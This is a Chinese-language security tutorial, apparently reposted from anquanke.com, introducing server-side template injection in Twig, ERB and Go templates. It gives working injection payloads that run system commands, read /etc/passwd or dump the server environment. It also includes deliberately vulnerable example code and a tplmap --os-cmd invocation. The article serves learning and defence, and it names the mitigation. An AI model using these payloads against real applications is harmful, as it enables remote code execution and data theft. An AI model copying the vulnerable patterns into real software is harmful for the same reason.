> 原文链接: https://www.anquanke.com//post/id/246093 


# SSTI漏洞学习 (上)——基础知识和一些不常见的模板引擎介绍


                                阅读量   
                                **38141**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t01894129e1e0f73a56.png)](https://p1.ssl.qhimg.com/t01894129e1e0f73a56.png)



## SSTI 简介

### <a class="reference-link" name="MVC"></a>MVC

MVC是一种框架型模式，全名是Model View Controller。

即模型(model)－视图(view)－控制器(controller)<br>
在MVC的指导下开发中用一种业务逻辑、数据、界面显示分离的方法组织代码，将业务逻辑聚集到一个部件里面，在改进和个性化定制界面及用户交互的同时，得到更好的开发和维护效率。

在MVC框架中，用户的输入通过 View 接收，交给 Controller ，然后由 Controller 调用 Model 或者其他的 Controller 进行处理，最后再返回给 View ，这样就最终显示在我们的面前了，那么这里的 View 中就会大量地用到一种叫做模板的技术。

绕过服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，而模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就会导致敏感信息泄露、代码执行、GetShell 等问题.

虽然市面上关于SSTI的题大都出在python上，但是这种攻击方式请不要认为只存在于 Python 中，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言。



## 常见的模板引擎和注入漏洞

### <a class="reference-link" name="Twig(PHP)"></a>Twig(PHP)

首先以Twig模板引擎介绍SSTI，很多时候，SSTI发生在直接将用户输入作为模板，比如下面的代码

```
&lt;?php
require_once "./vendor/autoload.php";

$loader = new \Twig\Loader\ArrayLoader([
    'index' =&gt; 'Hello `{``{` name `}``}`!',
]);
$twig = new \Twig\Environment($loader);


$template = $twig-&gt;createTemplate("Hello `{`$_GET['name']`}`!");

echo $template-&gt;render();
```

`createTemplate`时注入了`$_GET['name']`，就会引发SSTI

而如下代码则不会，因为模板引擎解析的是字符串常量中的``{``{`name`}``}``，而不是动态拼接的`$_GET["name"]`

```
&lt;?php
require_once "./vendor/autoload.php";

$loader = new \Twig\Loader\ArrayLoader([
    'index' =&gt; 'Hello `{``{` name `}``}`!',
]);
$twig = new \Twig\Environment($loader);

echo $twig-&gt;render('index', array("name" =&gt; $_GET["name"]));
```

而对于模板引擎的利用，往往是借助模板中的一些方法实现攻击目的，比如Twig中的过滤器`map`

[![](https://p1.ssl.qhimg.com/t01ef165455da86f66f.png)](https://p1.ssl.qhimg.com/t01ef165455da86f66f.png)

举个经典的例子

``{``{`["man"]|map((arg)=&gt;"hello #`{`arg`}`")`}``}``<br>
会被编译成下面这样

`twig_array_map([0 =&gt; "id"], function ($__arg__) use ($context, $macros) `{` $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))`

关于这个`twig_array_map`，源码中是这样的

[![](https://p5.ssl.qhimg.com/t01cdeb04ca691db91a.png)](https://p5.ssl.qhimg.com/t01cdeb04ca691db91a.png)

可以看到传入的`$arrow`被当作函数执行，那么可以不传`arrow function`，可以只传一个字符串,找个两个参数的能够命令执行的危险函数即可

比如

```
`{``{`["id"]|map("system")|join(",")`}``}`
`{``{`["phpinfo();"]|map("assert")|join(",")`}``}`
`{``{`["id", 0]|map("passthru")`}``}`
```

类似的，我们还可以找到一些其他的过滤器`sort`,`filiter`，网上也有较多介绍，就不再赘述了。

当然，SSTI还有一种基础的利用方式就是用来泄露源码和程序环境中的上下文信息，在`Twig`引擎中，我们可以通过下面方法获得一些关于当前应用的信息

```
`{``{`_self`}``}` #指向当前应用
`{``{`_self.env`}``}`
`{``{`dump(app)`}``}`
`{``{`app.request.server.all|join(',')`}``}`
```

### <a class="reference-link" name="ERB(Ruby)"></a>ERB(Ruby)

相较于`Twig`,ERB的代码直接提供了一些命令执行的接口，比如

```
&lt;%= system("whoami") %&gt;
&lt;%= system('cat /etc/passwd') %&gt;
&lt;%= `ls /` %&gt;
&lt;%= IO.popen('ls /').readlines()  %&gt;
```

这里提起他主要是引出模板标签的一些分类

比如这里的`ERB`模板标签使用`&lt;%= %&gt;`，`Twig`使用``{``{``}``}``，根据一些简单的poc和标签的分类，我们可以快速识别出是否存在模板漏洞以及所使用的模板引擎技术

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a66955048c86d5b6.png)

当然有些模板引擎的标签是可以自定义的，上面列出的只是默认情况

### <a class="reference-link" name="Golang%20SSTI"></a>Golang SSTI

关于Golang Template的SSTI研究目前来说还比较少，可能是因为本身设计的也比较安全。

不过通过``{``{`.`}``}``我们可以获得到作用域

[![](https://p2.ssl.qhimg.com/t019142c1c9d069ab59.png)](https://p2.ssl.qhimg.com/t019142c1c9d069ab59.png)

比如在下面这个例子中

```
package main

import (
    "html/template"
    "net/http"
)

func handler(w http.ResponseWriter, r *http.Request) `{`
    //var name = ""
    r.ParseForm() // Parses the request body
    x := r.Form.Get("name")
    var test map[string]interface`{``}`
    test = make(map[string]interface`{``}`)

    var secret map[string]interface`{``}`
    secret = make(map[string]interface`{``}`)

    flag := "flag`{`testflag`}`"
    secret["flag"] = &amp;flag

    test["secret"] = secret

    var tmpl = `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;
&lt;form action="/" method="post"&gt;
    First name:&lt;br&gt;
&lt;input type="text" name="name" value=""&gt;
&lt;input type="submit" value="Submit"&gt;
&lt;/form&gt;&lt;p&gt;` + x + ` &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;`

    t := template.New("main") //name of the template is main
    t, _ = t.Parse(tmpl)      // parsing of template string
    t.Execute(w, test)
`}`

func main() `{`
    server := http.Server`{`
        Addr: "0.0.0.0:5090",
    `}`
    http.HandleFunc("/", handler)
    server.ListenAndServe()
`}`
```

可以获取到作用域对象

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0132abe6fb5406e7b2.png)

进一步可以获得flag

[![](https://p0.ssl.qhimg.com/t019bc96580e9d22714.png)](https://p0.ssl.qhimg.com/t019bc96580e9d22714.png)

甚至如果在作用域中存在可以利用的函数，我们还可以调用该函数完成攻击,比如

```
type User struct `{`
    ID       int
    Email    string
    Password string
`}`

func (u User) System(test string) string `{`
    out, _ := exec.Command(test).CombinedOutput()
    return string(out)
`}`
```

就有

[![](https://p3.ssl.qhimg.com/t01410634ba0f4793ca.png)](https://p3.ssl.qhimg.com/t01410634ba0f4793ca.png)

### <a class="reference-link" name="Flask/Jinja"></a>Flask/Jinja

这个引擎应该是出镜率最高的了，能写的东西也很多，由于篇幅所限，具体内容会在（下）中展开记录。



## 常用检测工具 Tplmap

工具地址：[https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)

和sqlmap的设计风格一致，直接怼就行

```
/tplmap.py --os-cmd -u 'http://www.target.com/page?name=John'
```



## 总结

SSTI在MVC架构中是经常出现的一类问题，除去本文中介绍的几个引擎，还有许多受影响的引擎，比如Velocity 等。该问题主要是由于开发者直接将用户输入作为模板交给模板引擎渲染导致的，将用户输入绑定到模板的参数中可以缓解这一问题。通过SSTI，我们往往可以获取到程序运行的上下文环境，甚至利用模板引擎的内置方法完成远程代码注入等高危攻击。



## 参考资料

[https://xz.aliyun.com/t/7518](https://xz.aliyun.com/t/7518)

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

[https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)
